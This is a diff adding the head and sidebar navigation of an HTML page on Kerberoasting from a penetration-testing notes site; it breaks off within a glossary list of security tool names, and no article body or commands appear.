@@ -1,0 +1,592 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" data-content_root="../../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Kerberoasting - from Linux &mdash; Celestial Security Reference R1 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=8f9ffe49" />
+      <link rel="stylesheet" type="text/css" href="../../_static/css/theme.css?v=e59714d7" />
+      <link rel="stylesheet" type="text/css" href="../../_static/dark_mode_css/general.css?v=c0a7eb24" />
+      <link rel="stylesheet" type="text/css" href="../../_static/dark_mode_css/dark.css?v=70edf1c7" />
+
+  
+      <script src="../../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../../_static/documentation_options.js?v=3b1ff954"></script>
+      <script src="../../_static/doctools.js?v=9bcbadda"></script>
+      <script src="../../_static/sphinx_highlight.js?v=dc90522c"></script>
+      <script src="../../_static/dark_mode_js/default_dark.js?v=fd565c74"></script>
+      <script src="../../_static/dark_mode_js/theme_switcher.js?v=358d3910"></script>
+    <script src="../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="Changing the user-agent to avoid detection" href="../Lateral%20Movement/Changing%20the%20user-agent%20to%20avoid%20detection.html" />
+    <link rel="prev" title="Living Off the Land" href="Living%20Off%20the%20Land.html" />
+    <link href="../../_static/style.css" rel="stylesheet" type="text/css">
+
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../index.html" class="icon icon-home">
+            Celestial Security Reference
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Hack the Box Certifications</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Certified%20Penetration%20Tester.html">Certified Penetration Tester</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../CDSA/Certified%20Defensive%20Security%20Analyst.html">Certified Defensive Security Analyst</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Offensive Methods</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../OFSEC/recon/Active%20Scanning.html">Active Scanning</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Overview</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Overview/Introduction%20to%20Active%20Directory.html">Introduction to Active Directory</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Overview/Penetration%20Testing%20Overview.html">Penetration Testing Overview</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Overview/Types%20of%20Penetration%20testing.html">Types of Penetration testing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Overview/Vulnerability%20Assessment.html">Vulnerability Assessment</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Reconnaissance</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Penetration%20Testing%20Overview.html">Penetration Testing Overview</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Network%20Enumeration%20with%20nmap.html">Network Enumeration with nmap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Footprinting.html">Footprinting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Infrastructure%20Enumeration.html">Infrastructure Based Enumeration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Infrastructure%20Enumeration.html#domain-information">Domain information</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Infrastructure%20Enumeration.html#cloud-resource-enumeration">Cloud Resource Enumeration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Infrastructure%20Enumeration.html#online-tools-to-gather-information-about-a-domain">Online Tools to gather information about a domain</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Infrastructure%20Enumeration.html#staff">Staff</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Host%20Enumeration.html">Host Based Enumeration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/fingerprinting.html">fingerprinting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Initial%20Enumeration%20of%20a%20AD%20Domain.html">Initial Enumeration of a AD Domain</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/External%20Recon%20and%20Enumeration%20Principles.html">External Recon and Enumeration Principles</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Information%20Gathering.html">Information Gathering</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Initial Access</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="File%20Inclusion.html">File Inclusion</a></li>
+<li class="toctree-l1"><a class="reference internal" href="SSH%20Forwarding.html">SSH Forwarding</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Dynamic%20Port%20Forwarding%20with%20SSH%20and%20SOCKS%20Tunneling.html">Dynamic Port Forwarding with SSH and SOCKS Tunneling</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Remote-Reverse%20Port%20Forwarding%20with%20SSH.html">Remote-Reverse Port Forwarding with SSH</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Meterpreter%20Tunneling%20and%20Port%20Forwarding.html">Meterpreter Tunneling and Port Forwarding</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Socat%20Redirection%20with%20a%20Reverse%20Shell.html">Socat Redirection with a Reverse Shell</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Socat%20Redirection%20with%20a%20Bind%20Shell.html">Socat Redirection with a Bind Shell</a></li>
+<li class="toctree-l1"><a class="reference internal" href="SSH%20for%20Windows%3A%20plink.exe.html">SSH for Windows: plink.exe</a></li>
+<li class="toctree-l1"><a class="reference internal" href="SSH%20Pivoting%20with%20Sshuttle.html">SSH Pivoting with Sshuttle</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Web%20Server%20Pivoting%20with%20Rpivot.html">Web Server Pivoting with Rpivot</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Port%20Forwarding%20with%20Windows%20Netsh.html">Port Forwarding with Windows Netsh</a></li>
+<li class="toctree-l1"><a class="reference internal" href="DNS%20Tunneling%20with%20Dnscat2.html">DNS Tunneling with Dnscat2</a></li>
+<li class="toctree-l1"><a class="reference internal" href="SOCKS5%20Tunneling%20with%20Chisel.html">SOCKS5 Tunneling with Chisel</a></li>
+<li class="toctree-l1"><a class="reference internal" href="ICMP%20Tunneling%20with%20SOCKS.html">ICMP Tunneling with SOCKS</a></li>
+<li class="toctree-l1"><a class="reference internal" href="RDP%20and%20SOCKS%20Tunneling%20with%20SocksOverRDP.html">RDP and SOCKS Tunneling with SocksOverRDP</a></li>
+<li class="toctree-l1"><a class="reference internal" href="LLMNR%20NBT-NS%20Poisoning%20from%20Linux.html">LLMNR/NBT-NS Poisoning - from Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="LLMNR%20NBT-NS%20Poisoning%20from%20Windows.html">LLMNR-NBT-NS Poisoning - from Windows</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Password%20Attacks.html">Password Attacks</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Remote%20Password%20Attacks.html">Remote Password Attacks</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Using%20the%20Metasploit%20Framework.html">Using the Metasploit Framework</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Shells%20and%20Payloads.html">Shells and Payloads</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Attacking%20Common%20Services.html">Attacking Common Services</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Active%20Directory%20Enumeration%20Attacks.html">Active Directory Enumeration Attacks</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Password%20Spraying.html">Password Spraying</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Enumerating%20and%20Retrieving%20Password%20Policies.html">Enumerating and Retrieving Password Policies</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Internal%20Password%20Spraying%20from%20Linux.html">Internal Password Spraying from Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Internal%20Password%20Spraying%20from%20Windows.html">Internal Password Spraying from Windows</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Enumerating%20Security%20Controls.html">Enumerating Security Controls</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Credentialed%20Enumeration%20-%20from%20Linux.html">Credentialed Enumeration - from Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Credentialed%20Enumeration%20-%20from%20Windows.html">Credentialed Enumeration - from Windows</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Living%20Off%20the%20Land.html">Living Off the Land</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Kerberoasting - from Linux</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#description">Description</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#kerberoasting">Kerberoasting</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#spn">SPN</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#kerberoasting-performing-the-attack">Kerberoasting - Performing the attack</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#listing-spn-accounts-with-getuserspns-py">Listing SPN Accounts with GetUserSPNs.py</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#requesting-all-tgs-tickets">Requesting all TGS Tickets</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#requesting-a-single-tgs-ticket">Requesting a Single TGS ticket</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#saving-the-tgs-ticket-to-an-output-file">Saving the TGS Ticket to an Output File</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#cracking-the-ticket-offline-with-hashcat">Cracking the Ticket Offline with hashcat</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#testing-authentication-against-a-domain-controller">Testing Authentication against a Domain Controller</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#references">References</a></li>
+</ul>
+</li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Lateral Movement</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Lateral%20Movement/File%20Transfers.html">File Transfers</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Lateral%20Movement/Changing%20the%20user-agent%20to%20avoid%20detection.html">Changing the user-agent to avoid detection</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Lateral%20Movement/Native%20File%20Transfer%20Powershell.html">Native File Transfer Powershell</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Lateral%20Movement/Creating%20a%20secure%20upload%20server%20using%20Nginx.html">Creating a secure upload server using Nginx</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Lateral%20Movement/Hunting%20for%20Files.html">Hunting for Files</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Lateral%20Movement/Linux%20Pass%20the%20Ticket.html">Linux Pass the Ticket</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Lateral%20Movement/Pivoting-Tunneling%20and%20Port%20Forwarding.html">Pivoting-Tunneling and Port Forwarding</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Glossary</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Active%20Directory.html">Active Directory</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Active%20Directory%20Explorer.html">Active Directory Explorer</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ADRecon.html">ADRecon</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ADRecon.html#description">Description</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ADRecon.html#references">References</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/adidnsdump.html">adidnsdump</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/apache%20nutch.html">apache nutch</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Application%20Testing.html">Application Testing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Attacking%20AD%20and%20NTDS.dit.html">Attacking AD and NTDS.dit</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Attacking%20LSASS.html">Attacking LSASS</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Attacking%20the%20SAM.html">Attacking the SAM</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Base64.html">Base64</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Bash.html">Bash</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/bettercap.html">bettercap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Bitlocker.html">Bitlocker</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Black%20box%20Testing.html">Black box Testing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/bloodhound.html">bloodhound</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/bloodhound.py.html">bloodhound.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/builtwith.html">builtwith</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/burp%20suite.html">burp suite</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Certificates.html">Certificates</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/cewl.html">cewl</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/chisel.html">chisel</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Compliance%20Standards.html">Compliance Standards</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Compliance%20Standards.html#references">References</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/crackmapexec.html">crackmapexec</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/crawling.html">crawling</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/crowbar.html">crowbar</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/crunch.html">crunch</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/cupp.html">cupp</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/CVE-2021-1675.py.html">CVE-2021-1675.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/CVSS.html">CVSS</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/d3ad0ne.html">d3ad0ne</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/DKIM.html">DKIM</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/domainPasswordSpray.html">domainPasswordSpray</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/DMARC.html">DMARC</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/DNS.html">DNS</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/dnsenum.html">dnsenum</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/dnsrecon.html">dnsrecon</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/dnsx.html">dnsx</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/dsquery.html">dsquery</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ettercap.html">ettercap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/enum4linux-ng.html">enum4linux-ng</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Evasive%20testing.html">Evasive Testing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/evil-winrm.html">evil-winrm</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/extent.html">extent</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/GetNPUsers.py.html">GetNPUsers.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/fail2ban.html">fail2ban</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ffuf.html">ffuf</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/fierce.html">fierce</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/File%20Encryption%20on%20Linux.html">File Encryption on Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/File%20Encryption%20Windows.html">File Encryption Windows</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/finalRecon.html">finalRecon</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Firefox%20Decrypt.html">Firefox Decrypt</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/FTP.html">FTP</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/gettgtpkinit.py.html">gettgtpkinit.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/getnthash.py.html">getnthash.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/getuserspns.py.html">getuserspns.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/git.html">git</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/gobuster.html">gobuster</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/gpp-decrypt.html">gpp-decrypt</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Grey%20Box%20Testing.html">Grey Box Testing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Group3r.html">Group3r</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/hashcat.html">hashcat</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/hippa.html">hippa</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Hybrid%20evasive.html">Hybrid evasive</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/hydra.html">hydra</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/IMAP-POP3.html">IMAP-POP3</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/impacket.html">impacket</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/IPMP.html">IPMP</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/iso-27001.html">iso-27001</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/inveigh.html">inveigh</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/invoke-TheHash.html">Invoke-TheHash</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/john.html">john</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/keytab.html">keytab</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/keytabextract.py.html">keytabextract.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/kerberoast.html">kerberoast</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/kwprocessor.html">kwprocessor</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ldapsearch.html">ldapsearch</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/lazagne.html">lazagne</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/laps.html">laps</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/LAPSToolkit.html">LAPSToolkit</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/linkatz.html">Linikatz</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Linux%20local%20password%20attacks.html">Linux local password attacks</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Linux%20Mount.html">Linux Mount</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/lookupsid.py.html">lookupsid.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/kerbrute.html">kerbrute</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/md5sum.html">md5sum</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/metasploit.html">metasploit</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/medusa.html">medusa</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Microsoft%20DREAD.html">Microsoft DREAD</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/mimikatz.html">mimikatz</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/mitm6.html">mitm6</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/msfvenom.html">msfvenom</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/MSSQL.html">MSSQL</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/MySQL.html">MySQL</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/mssqlclient.py.html">mssqlclient.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/nessus.html">nessus</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/netcat.html">netcat</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/netcraft.html">netcraft</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/net-webclient.html">net-webclient</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Network%20Testing.html">Network Testing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/NIST.html">NIST</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/NFS.html">NFS</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/nikto.html">nikto</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/nmap.html">nmap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/nopac.py.html">nopac.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/netstat.html">netstat</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/netstat.html#usage">Usage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Non-evasive%20testing.html">Non-evasive testing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/O365spray.html">O365spray</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/openssl.html">openssl</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Oracle%20TNS.html">Oracle TNS</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/OSINT%20Framework.html">OSINT Framework</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/OSSTMM.html">OSSTMM</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/OWASP.html">OWASP</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/owasp-zap.html">owasp-zap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/pentest.html">pentest</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/petitpotam.py.html">petitpotam.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/pci-dss.html">pci-dss</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Physical%20Testing.html">Physical Testing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/PingCastle.html">PingCastle</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/powershell.html">powershell</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/powerview.html">powerview</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/PowerShell%20Web%20Uploads.html">PowerShell Web Uploads</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/princeprocessor.html">princeprocessor</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/proxychains.html">proxychains</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/psexec.html">psexec</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/psexec.py.html">psexec.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/PTES.html">PTES</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/pyenv.html">pyenv</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/raiseChild.py.html">raiseChild.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/r-services.html">r-services</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/rdp.html">rdp</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/recon-ng.html">recon-ng</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/reconSpider.html">reconSpider</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/responder.html">responder</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/rid.html">rid</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/rpc.html">rpc</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/rsync.html">rsync</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/rpcclient.html">rpcclient</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/rpcinfo.html">rpcinfo</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/rcpdump.py.html">rcpdump.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/rubeus.html">rubeus</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/S3%20Buckets.html">S3 Buckets</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/shadow%20credentials%20abusing.html">shadow credentials abusing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/sharpHound.html">sharpHound</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/sharpview.html">sharpview</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/smb.html">smb</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/smbserver.py.html">smbserver.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/scrappy.html">scrappy</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/sc.exe.html">sc.exe</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/sc.exe.html#description">Description</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/sc.exe.html#usage">Usage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/secretsdump.py.html">secretsdump.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/setspn.exe.html">setspn.exe</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/shells.html">shells</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/sid.html">sid</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/smbmap.html">smbmap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/SMTP.html">SMTP</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/smtp-user-enum.html">smtp-user-enum</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/smtp-user-enum.html#installation">Installation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/smtp-user-enum.html#usage">Usage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/smtp-user-enum.html#references">References</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/SNMP.html">SNMP</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/SQL%20Injection.html">SQL Injection</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/snaffler.html">snaffler</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Social%20Engineering%20Testing.html">Social Engineering Testing</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ssh.html">ssh</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/spf.html">spf</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/spiderfoot.html">spiderfoot</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/SQL%20Injection%20Types.html">SQL Injection Types</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/SQL%20Load%20file.html">SQL Load file</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/sqlcmd.html">sqlcmd</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/sqsh.html">sqsh</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/subbrute.html">subbrute</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/sudo.html">sudo</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/subfinder.html">subfinder</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Subverting%20SQL%20Query%20Logic.html">Subverting SQL Query Logic</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Symmetrical%20Encryption.html">Symmetrical Encryption</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/targetedKerberoast.py.html">targetedKerberoast.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/theharvester.html">theharvester</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ticketer.py.html">ticketer.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Transfer%20with%20Code.html">Transfer with Code</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Transferring%20File%20with%20GfxDownloadWrapper.exe.html">Transferring File with GfxDownloadWrapper.exe</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/tscon.exe.html">tscon.exe</a></li>
